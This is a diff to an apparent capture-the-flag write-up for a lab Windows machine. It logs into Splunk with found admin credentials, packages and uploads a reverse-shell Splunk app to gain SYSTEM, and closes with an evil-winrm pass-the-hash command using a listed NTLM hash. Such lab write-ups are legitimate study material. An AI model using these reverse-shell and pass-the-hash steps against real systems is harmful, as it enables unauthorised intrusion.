@@ -369,12 +369,23 @@ splunk creds admin:Sp1unkadmin@2k24
 Then we can use this credit to login into the dashboard
 ![](images/Pasted%20image%2020250404004051.png)
 spawn meterpreter shell and exploit SeImpersonatePrivilege
-```
-getsystem
-getuid
-cat /Users/Administrator/Desktop/root.txt
-# Welcome!
-```
+![](images/Pasted%20image%2020250404015246.png)
+Press the button of Manage Apps, then you can install app from file
+![](images/Pasted%20image%2020250404015321.png)
+For our payload file, 
 
+```
+Depending on the target machine, you will either need to edit the rev.py for unix type machines or run.ps1 for Windows machines. Enter your attacking machine IP and ports
+
+tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
+mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
+
+Launch your listener and upload this package via the app installation page.
+
+```
+Then we can successfully get the reverse shell as SYSTEM
+
+```
 Bonus
 `evil-winrm -u 'Administrator' -H '06dc954d32cb91ac2831d67e3e12027f' -i 10.10.11.61`
+```
